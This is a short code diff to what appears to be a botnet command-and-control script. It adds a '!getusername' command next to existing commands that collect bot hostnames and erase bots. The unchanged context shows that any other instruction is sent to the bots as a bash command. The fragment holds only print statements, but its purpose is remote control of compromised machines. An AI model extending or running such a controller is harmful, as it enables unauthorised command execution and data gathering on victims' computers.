@@ -103,6 +103,8 @@ def instruct():
                 print("\n[+] Obtaining hostnames of bots....")
             elif instruction.decode().lower().startswith('!erasebots'):
                 print("\n[+] Eradicating Bots.....")
+            elif instruction.decode().lower().startswith('!getusername'):
+                print("\n[+] Getting the usernames of the bots....")
             else:
                 print("")
                 print(f"[+] Sending '{instruction.decode()}' as a bash command to the bots.....")
